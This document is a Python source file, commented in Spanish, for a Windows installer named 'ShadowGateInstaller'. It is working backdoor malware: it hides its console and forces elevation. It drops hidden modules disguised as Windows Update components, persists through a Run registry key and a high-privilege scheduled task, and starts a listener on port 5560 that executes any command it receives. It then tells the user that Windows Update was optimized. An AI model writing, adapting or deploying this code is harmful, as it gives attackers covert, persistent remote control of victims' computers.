#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import shutil
from pathlib import Path
import time
import threading

# Ocultar ventana de consola inmediatamente
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


class ShadowGateInstaller:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.install_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper')
        self.hidden = True

    def is_admin(self):
        """Verificar si es administrador"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def force_admin_elevation(self):
        """FORZAR elevación a administrador - NUEVO MÉTODO MEJORADO"""
        if self.is_admin():
            return True  # Ya es admin, continuar

        print("Solicitando permisos de administrador...")

        # Reescribir el script para ejecutar como admin
        script = os.path.abspath(sys.argv[0])

        # Parámetros para ocultar mejor la ejecución
        params = f'"{script}" --elevated'

        try:
            # Ejecutar como administrador con ventana oculta
            result = ctypes.windll.shell32.ShellExecuteW(
                None,  # hWnd
                "runas",  # Operation
                sys.executable,  # File
                params,  # Parameters
                None,  # Directory
                0  # nShowCmd (0 = oculto)
            )

            if result > 32:  # Éxito
                print("Elevación exitosa. Saliendo...")
                sys.exit(0)
            else:
                print("Error en elevación. Continuando sin privilegios...")
                return False

        except Exception as e:
            print(f"Error elevando privilegios: {e}")
            return False

    def download_and_install(self):
        """Descargar e instalar dependencias silenciosamente"""
        dependencies = [
            "pyautogui", "opencv-python", "pillow", "cryptography",
            "termcolor", "psutil", "pyfiglet", "tabulate"
        ]

        for package in dependencies:
            try:
                # Instalar con tiempo de espera
                subprocess.run([
                    sys.executable, "-m", "pip", "install", package,
                    "--quiet", "--no-warn-script-location", "--disable-pip-version-check"
                ], capture_output=True, timeout=120, check=False)
                time.sleep(1)  # Pausa entre instalaciones
            except:
                continue  # Continuar con siguiente paquete

    def create_stealth_modules(self):
        """Crear módulos stealth"""
        modules = {
            "system_helper.py": '''#!/usr/bin/env python3
import socket
import threading
import time
import json
import subprocess
import os
import struct
from cryptography.fernet import Fernet

class StealthServer:
    def __init__(self):
        # Clave fija para compatibilidad
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.running = True
        self.port = 5560

        # Guardar clave para cliente
        key_path = os.path.join(os.path.dirname(__file__), "encryption.key")
        with open(key_path, 'wb') as f:
            f.write(self.key)

    def execute_command(self, cmd):
        """Ejecutar comando silenciosamente"""
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {
                'success': True, 
                'output': result.stdout, 
                'error': result.stderr,
                'return_code': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def handle_client(self, client, addr):
        """Manejar cliente"""
        try:
            # Recibir tamaño del mensaje
            size_data = client.recv(4)
            if not size_data:
                return

            size = struct.unpack('!I', size_data)[0]

            # Recibir datos completos
            encrypted_data = b''
            while len(encrypted_data) < size:
                chunk = client.recv(4096)
                if not chunk:
                    break
                encrypted_data += chunk

            if len(encrypted_data) != size:
                return

            # Descifrar
            try:
                decrypted_data = self.cipher.decrypt(encrypted_data)
                command = json.loads(decrypted_data.decode())
            except:
                # Fallback: intentar como texto plano
                try:
                    command = json.loads(encrypted_data.decode())
                except:
                    return

            # Ejecutar comando
            if isinstance(command, dict) and 'data' in command and 'command' in command['data']:
                result = self.execute_command(command['data']['command'])

                # Preparar respuesta
                response_json = json.dumps(result)
                encrypted_response = self.cipher.encrypt(response_json.encode())

                # Enviar tamaño + respuesta
                client.send(struct.pack('!I', len(encrypted_response)))
                client.send(encrypted_response)

        except Exception as e:
            # Silenciar todos los errores
            pass
        finally:
            try:
                client.close()
            except:
                pass

    def start_server(self):
        """Iniciar servidor stealth"""
        while self.running:
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.settimeout(5)  # Timeout para aceptar
                server.bind(('0.0.0.0', self.port))
                server.listen(5)

                print(f"Servidor iniciado en puerto {self.port}")

                while self.running:
                    try:
                        client, addr = server.accept()
                        client.settimeout(30)
                        threading.Thread(
                            target=self.handle_client, 
                            args=(client, addr),
                            daemon=True
                        ).start()
                    except socket.timeout:
                        continue
                    except:
                        break

            except Exception as e:
                # Error en servidor, reintentar después de pausa
                time.sleep(10)
            finally:
                try:
                    server.close()
                except:
                    pass

def main():
    """Función principal del servidor"""
    server = StealthServer()
    server.start_server()

if __name__ == "__main__":
    main()
''',
            "windows_update_service.py": '''#!/usr/bin/env python3
import time
import os
import sys
import subprocess

def main():
    """Servicio que mantiene el servidor ejecutándose"""
    server_path = os.path.join(os.path.dirname(__file__), "system_helper.py")

    while True:
        try:
            # Ejecutar servidor
            process = subprocess.Popen(
                [sys.executable, server_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Esperar a que termine
            process.wait()

            # Si termina, esperar y reiniciar
            time.sleep(10)

        except:
            time.sleep(30)

if __name__ == "__main__":
    main()
'''
        }

        # Crear directorio oculto
        os.makedirs(self.install_dir, exist_ok=True)
        if self.hidden:
            os.system(f'attrib +h "{self.install_dir}"')

        for filename, content in modules.items():
            filepath = os.path.join(self.install_dir, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)

            # Ocultar archivos individuales también
            os.system(f'attrib +h "{filepath}"')

    def setup_persistence(self):
        """Configurar persistencia en registro"""
        try:
            target_file = os.path.join(self.install_dir, "windows_update_service.py")
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(
                    key,
                    "WindowsUpdateService",
                    0,
                    winreg.REG_SZ,
                    f'"{sys.executable}" "{target_file}"'
                )
            return True
        except Exception as e:
            return False

    def setup_task_scheduler(self):
        """Configurar tarea programada como administrador"""
        if not self.is_admin():
            return False  # Necesitamos admin para tareas programadas

        try:
            task_name = "WindowsUpdateMaintenance"
            target_file = os.path.join(self.install_dir, "system_helper.py")

            # Crear tarea programada con privilegios elevados
            schtasks_cmd = [
                'schtasks', '/create', '/tn', task_name, '/tr',
                f'"{sys.executable}" "{target_file}"', '/sc',
                'minute', '/mo', '5', '/f', '/rl', 'HIGHEST'
            ]

            result = subprocess.run(
                schtasks_cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            return result.returncode == 0

        except:
            return False

    def start_server_immediately(self):
        """Iniciar servidor inmediatamente"""
        try:
            server_path = os.path.join(self.install_dir, "system_helper.py")

            # Iniciar proceso independiente
            subprocess.Popen(
                [sys.executable, server_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )

            return True
        except:
            return False

    def install_dependencies_as_admin(self):
        """Instalar dependencias con permisos de admin"""
        if not self.is_admin():
            return False

        try:
            # Instalar pip si no existe
            subprocess.run([
                sys.executable, "-m", "ensurepip", "--default-pip"
            ], capture_output=True, timeout=60)

            # Actualizar pip
            subprocess.run([
                sys.executable, "-m", "pip", "install", "--upgrade", "pip",
                "--quiet", "--no-warn-script-location"
            ], capture_output=True, timeout=120)

            return self.download_and_install()

        except:
            return False

    def install(self):
        """Instalación completa con privilegios"""
        try:
            # FORZAR elevación a administrador
            if not self.is_admin():
                print("Se requieren privilegios de administrador")
                return False

            print("Iniciando instalación con privilegios de administrador...")

            # Crear directorio de instalación
            os.makedirs(self.install_dir, exist_ok=True)
            os.system(f'attrib +h "{self.install_dir}"')

            # Instalar dependencias como admin
            self.install_dependencies_as_admin()

            # Crear módulos
            self.create_stealth_modules()

            # Configurar persistencia (solo funciona con admin)
            self.setup_persistence()
            self.setup_task_scheduler()

            # Iniciar servidor inmediatamente
            self.start_server_immediately()

            print("Instalación completada exitosamente")
            return True

        except Exception as e:
            print(f"Error en instalación: {e}")
            return False


def main():
    """Función principal"""
    # Ocultar consola inmediatamente
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    installer = ShadowGateInstaller()

    # Forzar elevación a administrador
    if not installer.is_admin():
        print("Solicitando elevación de privilegios...")
        installer.force_admin_elevation()
        sys.exit(0)

    # Si llegamos aquí, somos administradores
    print("Ejecutando con privilegios de administrador")

    # Simular actividad legítima
    for i in range(3):
        time.sleep(1)

    # Instalar
    if installer.install():
        print("Windows Update optimizado correctamente")
    else:
        print("Error en la optimización del sistema")

    # Salir silenciosamente
    sys.exit(0)


if __name__ == "__main__":
    main()